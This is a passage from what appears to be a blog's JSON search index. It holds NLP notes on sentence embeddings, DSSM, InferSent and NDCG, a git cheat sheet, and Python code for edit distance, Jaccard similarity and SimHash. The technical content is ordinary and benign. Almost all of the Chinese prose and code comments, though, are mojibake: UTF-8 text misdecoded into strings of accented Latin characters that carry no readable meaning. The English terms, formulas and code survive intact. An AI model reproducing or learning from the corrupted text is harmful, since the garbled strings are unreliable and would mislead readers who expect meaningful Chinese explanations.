å¿«è®­ç»ƒé€Ÿåº¦ï¼Œè€Œä¸”å­¦ä¹ äº†æ›´å¸¸è§çš„å•è¯è¡¨ç¤ºå½¢å¼ã€‚ è¯¥æ–‡ç« æ¨¡å‹ä¸­ï¼Œå¯¹è¯å‘é‡è¿›è¡Œéšå¼åŠ æƒï¼Œå› æ­¤åœ¨ä¸€äº›åœºæ™¯ä¸‹å¯ä»¥æ›´å¥½çš„åˆ©ç”¨æ–‡æ¡£çš„ç»Ÿè®¡ä¿¡æ¯ã€‚ Method latent variable generative model for text image \\(c_t\\)ä¸ºæ¥è‡ªlatent random walkçš„å¥å­å‘é‡ã€‚ä½¿ç”¨MAPæ–¹æ³•é¢„æµ‹ä¸‹ä¸€ä¸ªï¼ˆtime tï¼‰ç”Ÿæˆçš„è¯çš„æ¦‚ç‡ã€‚ Improved Random Walk model. image æ·»åŠ ä¸¤ä¸ªsmoothé¡¹ã€‚\\(p(w)\\): å³ä½¿å•è¯çš„å‘é‡ä¸\\(c_s\\)çš„å†…ç§¯éå¸¸ä½ï¼Œå•è¯ä¹Ÿå¯èƒ½å‡ºç°ã€‚\\(c_0\\): ä¸è¯­æ³•ç›¸å…³çš„sentenceå‘é‡æ ¡æ­£é¡¹ï¼Œä¿è¯æœ€é‡è¦çš„å‘é‡ç»´åº¦å¤„äºä¸»å¯¼åœ°ä½ã€‚å®ƒæé«˜äº†ä¸\\(c_0\\)æ–¹å‘ç›¸è¿‘çš„å•è¯åœ¨æ¨¡å‹ä¸­çš„å…±ç°æ¦‚ç‡ã€‚ Computing the sentence embedding å‡è®¾\\(Z\\)æ˜¯ä¸€ä¸ªå¸¸é‡ image è¶Šå¸¸è§çš„word \\(w\\)ï¼Œæƒé‡\\(a/(p(w) +a)\\)å°±è¶Šå°ï¼Œå¯ä»¥ä½¿embeddingä¸“æ³¨äºå…·æœ‰ä»£è¡¨æ€§çš„è¯ã€‚ ä¸ºäº†åˆ å»æ²¡æœ‰ä»£è¡¨æ€§çš„ä¿¡æ¯ï¼Œè®¡ç®—\\(c_0\\)çš„æ–¹å‘ä¸ºçŸ©é˜µçš„ç¬¬ä¸€ä¸ªä¸»æˆåˆ†ï¼ˆä¸è¿›è¡Œ centralizingï¼‰ã€‚ image Notes: PMI: Pointwise Mutual Information \\[ PMI = log \\frac{p(u, v)}{p(u)p(v)} \\] pPMI = max(0,PMI): positive Pointwise Mutual Information","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"}]},{"title":"Git sheet","slug":"Git-sheet","date":"2020-07-07T11:13:39.000Z","updated":"2023-08-07T11:54:31.029Z","comments":true,"path":"posts/cdcb5601.html","link":"","permalink":"https://racleray.github.io/posts/cdcb5601.html","excerpt":"Git cheat sheet","text":"basic 12345678$ git status # æ£€æŸ¥æ–‡ä»¶å½“å‰çš„çŠ¶æ€$ git add [æ–‡ä»¶å] # è¿½è¸ªæ–°çš„æ–‡ä»¶$ git diff --cached # è‹¥è¦çœ‹å·²ç»æš‚å­˜èµ·æ¥çš„æ–‡ä»¶å’Œä¸Šæ¬¡æäº¤æ—¶çš„å¿«ç…§ä¹‹é—´çš„å·®å¼‚$ git commit -m \"Story 182: Fix benchmark\" # ç”¨ä¸€è¡Œå‘½ä»¤æäº¤æ›´æ–°$ git commit -a -m 'added new benchmarks' # è·³è¿‡addå‘½ä»¤ç›´æ¥æäº¤$ git rm --cached log.log # ä»gitä»“åº“ä¸­åˆ é™¤ä¸å°å¿ƒè¿½è¸ªçš„æ–‡ä»¶ï¼ˆç”¨äºgitignoreä¹‹å‰è¿½è¸ªçš„æ–‡ä»¶ï¼‰ $ git mv file_from file_to # ç§»åŠ¨æ–‡ä»¶/é‡å‘½åæ–‡ä»¶$ git log â€‹ # æŸ¥çœ‹å†å²æ“ä½œ å…³è”è¿œç¨‹ä»“åº“ 1234567891011121314$ git init # åˆå§‹åŒ–è¿™ä¸ªæœ¬åœ°çš„æ–‡ä»¶å¤¹ä¸ºä¸€ä¸ªGitå¯ä»¥ç®¡ç†çš„ä»“åº“$ git remote add origin https://[åœ°å€] # å°†æœ¬åœ°çš„ä»“åº“å’Œè¿œç¨‹çš„ä»“åº“è¿›è¡Œå…³è”$ git pull &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;è¿œç¨‹åˆ†æ”¯å&gt;:&lt;æœ¬åœ°åˆ†æ”¯å&gt; # git pull origin master:master$ git add$ git commit -m$ git push -u origin master(é¦–æ¬¡å…³è”åŠ uï¼Œåç»­ä¸ç”¨)$ git push origin master$ git clone https://github.com/ã€‚ã€‚ã€‚$ git rm --cached \"æ–‡ä»¶è·¯å¾„\"ï¼Œä¸åˆ é™¤ç‰©ç†æ–‡ä»¶ï¼Œä»…å°†è¯¥æ–‡ä»¶ä»ç¼“å­˜ä¸­åˆ é™¤$ git rm --f \"æ–‡ä»¶è·¯å¾„\"ï¼Œä¸ä»…å°†è¯¥æ–‡ä»¶ä»ç¼“å­˜ä¸­åˆ é™¤ï¼Œè¿˜ä¼šå°†ç‰©ç†æ–‡ä»¶åˆ é™¤ï¼ˆä¸ä¼šå›æ”¶åˆ°åƒåœ¾æ¡¶ï¼‰$ git commit -m \"delete file\"$ git push branch 123456789101112131415 git branch # æŸ¥çœ‹åˆ†æ”¯$ git branch new-branch-name # åˆ›å»ºæ–°åˆ†æ”¯$ git branch -v # æŸ¥çœ‹å„åˆ†æ”¯æœ€åä¸€ä¸ªæäº¤å¯¹è±¡$ git branch --merged # æŸ¥çœ‹å·²ç»mergeè¿‡çš„åˆ†æ”¯$ git branch --no-merged # å°šæœªmergeçš„åˆ†æ”¯$ git branch -d testing # åˆ é™¤æ‰åˆ†æ”¯(å¦‚æœè¿˜æ²¡æœ‰merge,ä¼šå‡ºç°é”™è¯¯,-Då¯ä»¥å¼ºåˆ¶åˆ é™¤)$ git branch -a # æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ï¼ˆåŒ…æ‹¬è¿œç¨‹æœåŠ¡å™¨ï¼‰$ git push [è¿œç¨‹ä»“åº“å] [æœ¬åœ°åˆ†æ”¯å]:[è¿œç¨‹åˆ†æ”¯å] # æ¨é€æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹åˆ†æ”¯ # å¦‚æœæœ¬åœ°åˆ†æ”¯åä¸ºç©ºï¼Œåˆ™ä¼šç›´æ¥åˆ é™¤è¿œç¨‹åˆ†æ”¯å$ git checkout -b iss53 # æ–°å»ºåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯ =$ git branch iss53; git checkout iss53$ git reset ç‰ˆæœ¬å·$ git cherry-pick [id] # åˆå¹¶æŸä¸€ä¸ªå•ç‹¬çš„commit# åˆ›å»ºå¹¶åœ¨branchä¸Šä¿®æ”¹ä¹‹åï¼Œåœ¨ä»£ç ä»“åº“ç•Œé¢ï¼Œå¯ä»¥åœ¨pull requesté€‰é¡¹ä¸­ï¼Œé€‰æ‹©æ˜¯å¦merge pull requestï¼Œåˆå¹¶è¯¥åˆ†æ”¯çš„ä¿®æ”¹ organization 1234567# è¿œç¨‹åˆ›å»ºorganizationï¼šNew organization# organizationä¸­é€‰æ‹©Teamï¼Œåˆ›å»ºç®¡ç†å°ç»„# æ–°å»ºä»£ç ä»“åº“ï¼Œå½’å±äºorganizationï¼Œåœ¨settingä¸­è®¾ç½®Teamæƒé™ï¼Œåˆä½œè€…æƒé™# pull requestä¸­åŠ å…¥@TeamNameå¯ä»¥é€šçŸ¥æ‰€æœ‰äºº opensource 123456789101112131415# æ·»åŠ LICENSEï¼Œå¯ä½¿ç”¨templateæ¨¡æ¿åˆ›å»º# è´¡çŒ®å¼€æºé¡¹ç›®ï¼Œå¯ä»¥é¦–å…ˆæŸ¥çœ‹issueä¸­æ˜¯å¦æœ‰å·²ç»å‡ºç°çš„ç›¸åŒé—®é¢˜# forkä»“åº“ï¼Œç„¶ågit cloneåˆ°æœ¬åœ°$ git checkout -b fix-bug # æ–°å»ºåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯# ä¿®æ”¹$ git add .$ git commit -m \"message\"$ git push origin fix-bug# åœ¨forké¡¹ç›®ä¸­ ç‚¹å‡»New pull requestï¼Œå‘åŸé¡¹ç›®æäº¤æ›´æ”¹ log 12$ git log --pretty=format:\"%h - %an, %ar : %s\" # ç”¨ç‰¹æ€§çš„formatæŸ¥çœ‹log$ git log --graph # ç”¨å›¾è¡¨çš„å½¢å¼æ˜¾ç¤ºgitçš„åˆå¹¶å†å² config 1234$ git config --global user.name \"John Doe\" # é…ç½®ç”¨æˆ·å ï¼ä»…ç¬¬ä¸€æ¬¡å¿…é¡»$ git config --global user.email je@example.com # é…ç½®ç”µé‚® ï¼ä»…ç¬¬ä¸€æ¬¡å¿…é¡»$ git config --list # æŸ¥çœ‹é…ç½®ä¿¡æ¯$ git config --global alias.stash-unapply '!git stash show -p | git apply -R' # è®¾ç½®åˆ«å stash 123456$ git stash # å‚¨è—å½“å‰å·¥ä½œå†…å®¹$ git stash list # æŸ¥çœ‹æ‰€æœ‰å·²ç»å‚¨è—çš„å†…å®¹$ git stash apply [stash@&#123;0&#125;] # åœ¨å½“å‰å·¥ä½œåŒºåº”ç”¨å‚¨è—çš„å†…å®¹ï¼Œé»˜è®¤æœ€æ–°$ git stash apply --index # åœ¨å½“å‰å·¥ä½œåŒºåº”ç”¨å‚¨è—çš„å†…å®¹ï¼Œå¹¶ä¿æŒä¹‹å‰æš‚å­˜åŒºçš„çŠ¶æ€$ git stash drop # åˆ é™¤ä¸€ä¸ªå‚¨è—$ git stash pop # å¼¹å‡ºä¸€ä¸ªå‚¨è— rejectedé—®é¢˜ 12345# é€šå¸¸æ˜¯å› ä¸ºåœ¨è¿œç¨‹ä»“åº“ä¸­æ›´æ”¹äº†ï¼Œè€Œæœ¬åœ°æ²¡æœ‰ä¿®æ”¹ï¼Œé€ æˆå†²çªã€‚ä¸€èˆ¬å…ˆåœ¨æœ¬åœ°å…ˆpullå†pushï¼Œä¸ä¼šå‡ºç°è¿™æ ·çš„é—®é¢˜ã€‚$ git fetch origin$ git rebase origin/master$ git push sshå¯†åŒ™é—®é¢˜ï¼Œæ²¡æœ‰æƒé™è®¿é—®ä»“åº“ 123456789# é‡æ–°è®¾ç½®ssh keygit config --global user.name 'racleray'git config --global user.email 'racleme@outlook.com'ssh-keygen -t rsa -C 'racleme@outlook.com'# åœ¨homeç›®å½•æ‰¾ .ssh/id_rsa.pub# åœ¨githubç½‘ç«™çš„SSH keysæ·»åŠ new key","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"git","slug":"Tools/git","permalink":"https://racleray.github.io/categories/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://racleray.github.io/tags/git/"}]},{"title":"æ–‡æœ¬ç›¸ä¼¼æ€§æ·±åº¦å­¦ä¹ æ–¹æ³•","slug":"æ–‡æœ¬ç›¸ä¼¼æ€§æ·±åº¦å­¦ä¹ æ–¹æ³•","date":"2020-07-07T10:49:20.000Z","updated":"2023-08-07T11:54:31.045Z","comments":true,"path":"posts/bad75bd3.html","link":"","permalink":"https://racleray.github.io/posts/bad75bd3.html","excerpt":"è®°å½•æ–‡æœ¬è¯­ä¹‰åŒ¹é…æ¨¡å‹ã€‚åŒ…æ‹¬ InferSentã€DSSM ç­‰å¸¸è§æ¨¡å‹ã€‚","text":"åŸºäºæ·±åº¦å­¦ä¹ çš„è¯­ä¹‰åŒ¹é…æ–¹æ³•ä¸€èˆ¬æœ‰ä¸¤ç§ç±»å‹ï¼š Representation-based Matchï¼šç®€å•ï¼Œé€Ÿåº¦å¿«ã€‚ Interaction-based Matchï¼šè®¡ç®—ç›¸å¯¹å¤æ‚ï¼Œå‚æ•°ç©ºé—´ä¹Ÿæ›´å¤§ã€‚ Representation-based Representation-based Matchå¥å­ç›¸ä¼¼åº¦è®¡ç®—çš„ä¸€èˆ¬è®­ç»ƒæµç¨‹å¦‚ä¸‹ï¼š å‡†å¤‡åŒä¹‰å¥æ•°æ®é›†ï¼ˆæ¯”å¦‚ï¼ŒThe Paraphrase Databaseï¼ŒParaNMT-50Mï¼‰ï¼› é€‰æ‹©æ¨¡å‹ç»“æ„ï¼ˆæ¯”å¦‚ï¼ŒWord Averagingï¼ŒBiLSTM Averagingç­‰ï¼‰ï¼› Word Averagingæ¨¡å‹ï¼šå¹³å‡å¥å­ä¸­çš„æ‰€æœ‰è¯å‘é‡ä½œä¸ºå¥å­è¯­ä¹‰çš„è¡¨è¾¾ BiLSTM Averagingæ¨¡å‹ï¼šåˆå¹¶å‰å‘å’Œåå‘LSTMç¼–ç å¾—åˆ°çš„éšå‘é‡ä½œä¸ºå¥å­è¯­ä¹‰çš„è¡¨è¾¾ ç›¸å¯¹è¿›é˜¶ä¸€ç‚¹çš„æ¨¡å‹æœ‰InferSentï¼ŒDSSMï¼ŒCDSSM é€‰æ‹©è´Ÿæ ·æœ¬ï¼š ä»å½“å‰batchä¸­å¯»æ‰¾ä¸å½“å‰å¥å­æ„ä¹‰ï¼ˆæ ¹æ®å½“å‰æ¨¡å‹åˆ¤æ–­ï¼‰æœ€ä¸ç›¸è¿‘ çš„å¥å­ã€‚ æˆ–è€…ï¼ŒMega-batchingï¼šä»æ›´å¤§çš„æ ·æœ¬ï¼ˆåˆå¹¶å¤šä¸ªmini batchesï¼‰ä¸­å¯»æ‰¾ æ„ä¹‰è¾ƒè¿œçš„å¥å­ã€‚ ä¼˜åŒ–ç›®æ ‡ï¼šhinge loss \\[ \\begin{array}{l} \\min _{W_{c}, W_{w}} \\frac{1}{|S|}\\left(\\sum_{\\left\\langle s_{1}, s_{2}\\right\\rangle \\in S} \\max \\left(0, \\delta-\\cos \\left(g\\left(s_{1}\\right), g\\left(s_{2}\\right)\\right)\\right.\\right. \\\\ \\left.+\\cos \\left(g\\left(s_{1}\\right), g\\left(t_{1}\\right)\\right)\\right)+\\max \\left(0, \\delta-\\cos \\left(g\\left(s_{1}\\right), g\\left(s_{2}\\right)\\right)\\right. \\\\ \\left.\\left.+\\cos \\left(g\\left(s_{2}\\right), g\\left(t_{2}\\right)\\right)\\right)\\right)+\\lambda_{c}\\left\\|W_{c}\\right\\|^{2}+\\lambda_{w}\\left\\|W_{w_{\\text {initial}}}-W_{w}\\right\\|^{2} \\end{array} \\] sä¹‹é—´æ­£æ ·æœ¬ç›¸ä¼¼åº¦è¦å°½é‡æ¥è¿‘\\(\\delta\\)ï¼Œä¸è´Ÿæ ·æœ¬tä¹‹é—´ç›¸ä¼¼åº¦è¦å°½é‡å¤§ã€‚åŒæ—¶åœ¨æ­£åˆ™åŒ–ä¸­åŠ å…¥è¯å‘é‡å˜åŒ–çº¦æŸï¼Œè®¡ç®—ä¹‹åçš„è¯å‘é‡ä¸èƒ½å’Œåˆå§‹åŒ–ä½¿ç”¨çš„Gloveï¼ˆæˆ–å…¶ä»–ï¼‰è¯å‘é‡ç›¸å·®è¿‡å¤§ã€‚ InferSent â€‹ InferSent Git â€‹ ç»™å®šä¸¤ä¸ªå¥å­ï¼Œé¢„æµ‹ä¸¤ä¸ªå¥å­ä¹‹é—´çš„å…³ç³» (entailmentéšå«, contradictionäº’æ–¥, neutralæ— å…³)ï¼Œå³é¢„æµ‹ä¸‰ç§æ¦‚ç‡ã€‚ image â€‹ encoderä½œä¸ºè¯­å¥ç‰¹å¾çš„æå–å™¨ã€‚ â€‹ è®­ç»ƒæ—¶ï¼Œè‹¥åªä¸ºå­¦ä¹ sentence representationï¼Œçº¿æ€§åˆ†ç±»å™¨ä¹Ÿè®¸ä¼šå¾—åˆ°æ¯”è¾ƒå¥½çš„æ•ˆæœã€‚ä¸ºäº†è¾¾åˆ°æ›´å¥½çš„åˆ†ç±»æ•ˆæœï¼Œå¯ä»¥é‡‡ç”¨æ›´å¤æ‚çš„éçº¿æ€§åˆ†ç±»å™¨ã€‚ DSSM(Deep Structured Semantic Model) â€‹ å¾®è½¯ç ”ç©¶é™¢ä½¿ç”¨ï¼Œç”¨æˆ·æœç´¢çš„å…³é”®è¯å’Œæœ€ç»ˆç‚¹å¼€çš„ç½‘é¡µæ ‡é¢˜ç»„æˆçš„æ•°æ®ï¼Œè®­ç»ƒç›¸ä¼¼åº¦è®¡ç®—æ¨¡å‹ã€‚DSSMå°†è¯­å¥æ˜ å°„åˆ°è¯­ä¹‰ç©ºé—´çš„è¿ç»­è¡¨ç¤ºï¼Œè®¡ç®—ç›¸ä¼¼æ€§ã€‚ Word Hashing â€¢ ç”¨äºè§£å†³å•è¯è¡¨å’Œout of vocabularyé—®é¢˜ â€¢ æŠŠå•è¯(e.g. good)å‰ååŠ ä¸Š# (#good#) â€¢ ç„¶åå–æ‰€æœ‰çš„trigram (#go, goo, ood, od#)ï¼Œè¡¨ç¤ºæˆbag of trigram å‘é‡ â€‹ åŸè¯è¡¨è½¬æ¢ä¸ºäº†Compact representationï¼Œå¤§å°ä¼šå˜å°ï¼ŒèŠ‚çœäº†ç©ºé—´ã€‚ â€‹ å¯¹æ‹¼å†™é”™è¯¯æœ‰ä¸€å®šé²æ£’æ€§ã€‚ â€‹ åœ¨å¤§å‹NLPä»»åŠ¡ä¸­å¯ä»¥è½»æ¾ä½¿ç”¨ã€‚ æ¨¡å‹ image image è®­ç»ƒç›®æ ‡ï¼š image CDSSM image â€‹ convolutional layeræ•æ‰äº†å±€éƒ¨ä¸Šä¸‹æ–‡çš„å«ä¹‰ã€‚é‚£ä¹ˆç›¸åŒå•è¯åœ¨ä¸åŒä¸Šä¸‹æ–‡ä¸­çš„å¤šä¹‰æ€§ï¼Œå°±å¯èƒ½é€šè¿‡æ¨¡å‹æ•æ‰ã€‚ â€‹ global poolingæ•æ‰è¯­å¥æ•´ä½“çš„æ„å›¾ã€‚å®éªŒä¸­ï¼Œä¸€èˆ¬æƒ…å†µä¸‹max poolingèƒ½å¤Ÿè¾ƒå‡†ç¡®åœ°æå–å‡ºæ•´ä½“è¯­ä¹‰ã€‚ Recurrent DSSM image â€‹ å¯¹æ¯”Seq2Seqï¼ŒDSSMå€¾å‘äºåœ¨è¯­å¥è¯­ä¹‰ç©ºé—´å†…ä¼˜åŒ–ï¼Œè€ŒSeq2Seqæ›´å€¾å‘äºåœ¨word-levelè¿›è¡Œå­¦ä¹ ä¼˜åŒ–ã€‚ è¯„ä»·æŒ‡æ ‡ â€‹ NDCG a measure of ranking quality. â€‹ ä¸¤ä¸ªåŸºæœ¬å‡è®¾ï¼š ç›¸å…³åº¦è¶Šé«˜ï¼Œæ’åè¶Šé«˜ã€‚ é«˜åº¦ç›¸å…³çš„æ’åé«˜äºéƒ¨åˆ†ç›¸å…³ï¼Œéƒ¨åˆ†ç›¸å…³çš„æ’åé«˜äºæ— å…³ã€‚ Cumulative Gain image â€‹ \\(rel_i\\) -- æ˜¯ç›¸å…³åº¦åˆ†æ•°ï¼Œæ¯”å¦‚ï¼Œç¬¬iä¸ªç»“æœé«˜åº¦ç›¸å…³ä¸º5åˆ† Discounted Cumulative Gain image â€‹ å¯¹é«˜åº¦ç›¸å…³çš„ç»“æœå‡ºç°åœ¨rankingé åä½ç½®æ—¶ï¼Œè¿›è¡Œæƒ©ç½šã€‚ â€‹ å¦ä¸€ä¸ªå½¢å¼ä¸ºï¼š image â€‹ è¿™ä¸ªå½¢å¼ç›¸å¯¹æ¯”è¾ƒå¸¸ç”¨ã€‚ NDCGï¼šnormalized discounted cumulative gain image image Example â€‹ ä»¤0 -- ä¸ç›¸å…³ï¼Œ1ï¼Œ2 -- ä¸åŒç¨‹åº¦éƒ¨åˆ†ç›¸å…³ï¼Œ3 -- é«˜åº¦ç›¸å…³ã€‚ç›¸å…³æ€§ç®—æ³•æ’åºäº†å‰6ä¸ªç»“æœï¼Œé™åºï¼š image â€‹ è€Œç”¨æˆ·æ•°æ®ä¸­çš„ç›¸å…³æ€§åˆ†æ•°Ground Truthä¸ºï¼Œæ¯ä¸ªä½ç½®indexä»£è¡¨ä¸€ä¸ªè¯­å¥ï¼š image â€‹ Cumulative Gainï¼Œç®€å•ç›¸åŠ ï¼š image â€‹ Discounted Cumulative Gainï¼ŒDCGç»“æœä¸ºï¼š image image â€‹ NDCGçš„IDCGï¼Œä¸ºæœŸæœ›çš„ç›¸å…³æ€§æ’åˆ—é¡ºåºï¼Œå³æœŸæœ›çš„æœ€ä¼˜è¾“å‡ºï¼š image image image DSSMçš„å…¶ä»–åº”ç”¨ è®­ç»ƒword embeddingï¼šä¸Šä¸‹æ–‡ä¸ä¸­å¿ƒè¯çš„è¯­ä¹‰ç›¸ä¼¼æ€§ Knowledge Base Embeddingå­¦ä¹  QA Information Retrieval Contextual Entity Ranking Interaction-based Matching DRMMï¼šDeep Relevance Matching Model image â€‹ è¾“å…¥ç½‘ç»œçš„ç‰¹å¾æ˜¯å¤„ç†è¿‡çš„ï¼ŒæŠŠmatchingåˆ†æ•°è½¬åŒ–ä¸ºhistogramç»Ÿè®¡ç‰¹å¾ï¼š image â€‹ å³qçš„termä¸dè®¡ç®—cosine similarityï¼Œä¸æ˜¯ä¹˜æ³•ï¼Œç„¶åç»Ÿè®¡å¤šä¸ªä¸åŒåŒºé—´çš„ç›¸ä¼¼åº¦çš„ç»Ÿè®¡åˆ†å¸ƒã€‚ Term Gating Network â€‹ Term Gating Networkç”¨äºè®¡queryä¸­æ¯ä¸ªtermçš„weightã€‚ image Hinge loss image","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"text similarity","slug":"text-similarity","permalink":"https://racleray.github.io/tags/text-similarity/"},{"name":"DSSM","slug":"DSSM","permalink":"https://racleray.github.io/tags/DSSM/"},{"name":"CDSSM","slug":"CDSSM","permalink":"https://racleray.github.io/tags/CDSSM/"}]},{"title":"æ–‡æœ¬ç›¸ä¼¼æ€§","slug":"æ–‡æœ¬ç›¸ä¼¼æ€§","date":"2020-07-07T10:19:49.000Z","updated":"2023-08-07T11:54:31.044Z","comments":true,"path":"posts/1074fc0d.html","link":"","permalink":"https://racleray.github.io/posts/1074fc0d.html","excerpt":"è®°å½•ä¼ ç»Ÿçš„æ–‡æœ¬ç›¸ä¼¼æ€§åŒ¹é…æ–¹æ³•ï¼ˆç¼–è¾‘è·ç¦»ã€SimHashç­‰ï¼‰ï¼Œä¸word2vecç­‰æ–¹æ³•ã€‚","text":"åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„æ–‡æœ¬ç›¸ä¼¼åº¦ Hamming distance â€‹ ä¸¤ä¸ªç›¸åŒé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œæœ‰å¤šå°‘ä¸ªä½ç½®æ˜¯ä¸åŒçš„token. e.g., d(cap, cat) = 1 ç¼–è¾‘è·ç¦» â€‹ ç»™å®šä¸¤ä¸ªå¥å­ï¼Œæœ€å°‘éœ€è¦ç»è¿‡å¤šå°‘æ­¥æ“ä½œï¼ˆåˆ é™¤ï¼Œæ·»åŠ ï¼Œæ›¿æ¢ï¼‰èƒ½å¤Ÿä»ä¸€ä¸ªå¥å­è½¬åŒ–æˆå¦ä¸€ä¸ªå¥å­ 1234567891011121314151617181920212223def editDistDP(s1, s2): \"\"\"ç¼–è¾‘è·ç¦»è®¡ç®— paramsï¼šæ–‡æœ¬1ï¼Œstring æ–‡æœ¬2ï¼Œstring \"\"\" m = len(s1.strip()) n = len(s2.strip()) # åˆ›å»ºä¸€å¼ è¡¨æ ¼è®°å½•æ‰€æœ‰å­é—®é¢˜çš„ç­”æ¡ˆ dp = [[0 for x in range(n+1)] for x in range(m+1)] # ä»ä¸Šå¾€ä¸‹å¡«å……DPè¡¨æ ¼ for i in range(m+1): for j in range(n+1): if i == 0 or j == 0: dp[i][j] = max(i, j) # å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç»“å°¾å­—æ¯ç›¸åŒï¼Œè·ç¦»ä¸å˜ elif s1[i-1] == s2[j-1]: dp[i][j] = dp[i-1][j-1] # å¦‚æœç»“å°¾å­—æ¯ä¸åŒï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘ä¸‰ç§æƒ…å†µï¼Œå–æœ€å°çš„ç¼–è¾‘è·ç¦» # æ›¿æ¢ï¼Œæ·»åŠ ï¼Œåˆ é™¤ else: dp[i][j] = 1 + min(dp[i-1][j-1], dp[i][j-1], dp[i-1][j]) return dp[m][n] Jaccard Similarity â€‹ ç»™å®šä¸¤å¥è¯ï¼ŒæŠŠä¸¤å¥è¯ä¸­å‡ºç°çš„å•è¯å–äº¤é›†å’Œå¹¶é›†ï¼Œäº¤é›†å’Œå¹¶é›†çš„å¤§å°ä¹‹å•†å³ä¸ºJaccard Similarityã€‚ â€‹ Jaccard Similarityåªè€ƒè™‘å•è¯å‡ºç°ä¸å¦ï¼Œå¿½ç•¥æ¯ä¸ªå•è¯çš„å«ä¹‰ï¼Œå¿½ç•¥å•è¯çš„é¡ºåºï¼Œæ²¡æœ‰è€ƒè™‘å•è¯å‡ºç°çš„æ¬¡æ•°ã€‚ 123456def jaccard_sim(s1, s2): \"\"\"äº¤å¹¶æ¯”\"\"\" a = set(s1.strip().split()) b = set(s2.strip().split()) c = a.intersection(b) return float(len(c) / (len(a) + len(b) - len(c))) åŸºäºæ–‡æœ¬ç‰¹å¾çš„ç›¸ä¼¼åº¦è®¡ç®—æ–¹æ³• SimHash é€‰æ‹©ä¸€ä¸ªhashsizeï¼Œä¾‹å¦‚32 V = [0] * 32 æŠŠä¸€æ®µtextå˜æˆfeatures (shingles) æŠŠæ¯ä¸ªfeatureéƒ½hashæˆ32ä½ å¯¹äºæ¯ä¸ªhashçš„æ¯ä¸ªä½ç½®ï¼Œå¦‚æœä½ç½®ä¸Šæ˜¯1å°±æŠŠV[i]åŠ 1ï¼Œå¦‚æœä¸æ˜¯å°±æŠŠV[i]å‡1 æœ€åï¼Œå¦‚æœV[i]&gt;0å°±è®¾ä¸º1ï¼Œå¦åˆ™è®¾ä¸º0ï¼Œå¾—åˆ°çš„Vå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„simhashå€¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123import reimport sysimport hashlibimport loggingimport numbersimport collectionsfrom itertools import groupbydef _hashfunc(x): # ä½¿ç”¨çš„hashå‡½æ•° return int(hashlib.md5(x).hexdigest(), 16)class Simhash(object): def __init__(self, value, f=64, reg=r'[\\w\\u4e00-\\u9fcc]+', hashfunc=None, log=None): \"\"\" `f` is the dimensions of fingerprints `reg` is meaningful only when `value` is str and describes what is considered to be a letter inside parsed string. Regexp object can also be specified (some attempt to handle any letters is to specify reg=re.compile(r'\\w', re.UNICODE)) `hashfunc` accepts a utf-8 encoded string and returns a unsigned integer in at least `f` bits. \"\"\" self.f = f self.reg = reg self.value = None if hashfunc is None: self.hashfunc = _hashfunc else: self.hashfunc = hashfunc if log is None: self.log = logging.getLogger(\"simhash\") else: self.log = log if isinstance(value, Simhash): self.value = value.value elif isinstance(value, str): # print(\"build by text\") self.build_by_text(str(value)) elif isinstance(value, collections.Iterable): self.build_by_features(value) elif isinstance(value, numbers.Integral): self.value = value else: raise Exception('Bad parameter with type &#123;&#125;'.format(type(value))) def __eq__(self, other): \"\"\" Compare two simhashes by their value. :param Simhash other: The Simhash object to compare to \"\"\" return self.value == other.value def _slide(self, content, width=4): return [ content[i:i + width] for i in range(max(len(content) - width + 1, 1)) ] def _tokenize(self, content): content = content.lower() content = ''.join(re.findall(self.reg, content)) ans = self._slide(content) return ans def build_by_text(self, content): features = self._tokenize(content) features = &#123;k: sum(1 for _ in g) for k, g in groupby(sorted(features))&#125; return self.build_by_features(features) def build_by_features(self, features): \"\"\" æ ¸å¿ƒæ–¹æ³• `features` might be a list of unweighted tokens (a weight of 1 will be assumed), a list of (token, weight) tuples or a token -&gt; weight dict. \"\"\" v = [0] * self.f # åˆå§‹åŒ– [0,0,0,...] masks = [1 &lt;&lt; i for i in range(self.f)] # äºŒè¿›åˆ¶ä¸‹[1000, 0100, 0010, ...] if isinstance(features, dict): features = features.items() for f in features: if isinstance(f, str): h = self.hashfunc(f.encode('utf-8')) # hashæˆ32ä½ w = 1 else: assert isinstance(f, collections.Iterable) h = self.hashfunc(f[0].encode('utf-8')) w = f[1] for i in range(self.f): # maskä½ç½®ä¸º1ï¼Œåˆ™viåŠ ä¸Šwï¼Œå¦åˆ™å‡å»w v[i] += w if h &amp; masks[i] else -w ans = 0 for i in range(self.f): if v[i] &gt; 0: # å¦‚æœå¤§äº0ï¼Œå°±æŠŠé‚£ä¸€ä½å˜æˆ1 ans |= masks[i] self.value = ans def distance(self, another): \"\"\"è®¡ç®—ä¸¤ä¸ªvectoræœ‰å¤šå°‘ä¸ªä½ç½®ä¸ä¸€æ ·\"\"\" assert self.f == another.f x = (self.value ^ another.value) &amp; ((1 &lt;&lt; self.f) - 1) # (1 &lt;&lt; self.f) - 1: self.fä¸ªä½çš„1 ans = 0 while x: # bin(x)ä¸å…¨ä¸º0ï¼Œå³xé0 ans += 1 x &amp;= x - 1 # binè®¡ç®—ï¼Œæ¯ç®—ä¸€æ¬¡ï¼Œä½ä½çš„ç¬¬ä¸€ä¸ª1å˜ä¸º0 return ans 